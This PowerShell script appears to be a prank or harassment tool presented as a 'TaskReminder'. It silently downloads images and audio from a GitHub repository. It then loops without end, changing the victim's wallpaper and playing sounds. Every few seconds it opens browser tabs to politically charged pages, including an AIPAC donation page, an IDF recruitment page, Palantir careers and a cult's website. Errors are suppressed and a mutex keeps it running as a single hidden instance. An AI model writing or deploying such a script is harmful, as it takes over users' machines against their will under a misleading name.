# ================= CONFIG =================
$BaseUrl = "https://raw.githubusercontent.com/Kiyan-7/telaviv/main"

$Sites = @{
    1 = "https://heavensgate.com/"
    2 = "https://action.aipac.org/aipac-pac-donate"
    3 = "https://www.palantir.com/careers/"
    4 = "https://www.idf.il/en/mini-sites/how-to-join-us-and-voluntary-programs/how-to-join/"
    5 = "https://example.com/task5"
}

$MinSeconds  = 1
$MaxSeconds  = 5
$Volume      = 0     # 0.0 - 1.0 (50%)
$AvoidRepeat = $true   # don't pick the same task twice in a row
# ==========================================

$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$Dir = Join-Path $env:TEMP "TaskReminder"
New-Item -ItemType Directory -Path $Dir -Force | Out-Null

# Only one copy at a time
$mutex = New-Object System.Threading.Mutex($false, "Local\TaskReminderLoop")
if (-not $mutex.WaitOne(0)) { exit }
$PID | Out-File (Join-Path $Dir "pid.txt")

# Download assets
foreach ($i in 1..5) {
    foreach ($f in "image$i.jpg", "audio$i.wav") {
        $dest = Join-Path $Dir $f
        if (-not (Test-Path $dest)) {
            Invoke-WebRequest -UseBasicParsing "$BaseUrl/$f" -OutFile $dest
        }
    }
}

# Wallpaper helper
Add-Type @"
using System.Runtime.InteropServices;
public class WP {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int a, int b, string c, int d);
}
"@
Set-ItemProperty "HKCU:\Control Panel\Desktop" WallpaperStyle "10"   # Fill
Set-ItemProperty "HKCU:\Control Panel\Desktop" TileWallpaper  "0"

# Audio player (volume is relative to system volume)
Add-Type -AssemblyName PresentationCore
$player = New-Object System.Windows.Media.MediaPlayer

$last = 0
while ($true) {
    do { $x = Get-Random -Minimum 1 -Maximum 6 } while ($AvoidRepeat -and $x -eq $last)
    $last = $x

    [WP]::SystemParametersInfo(20, 0, (Join-Path $Dir "image$x.jpg"), 3) | Out-Null

    $player.Open([Uri](Join-Path $Dir "audio$x.wav"))
    $player.Volume = $Volume
    $player.Play()

    Start-Process $Sites[$x]

    Start-Sleep -Seconds (Get-Random -Minimum $MinSeconds -Maximum ($MaxSeconds + 1))
}
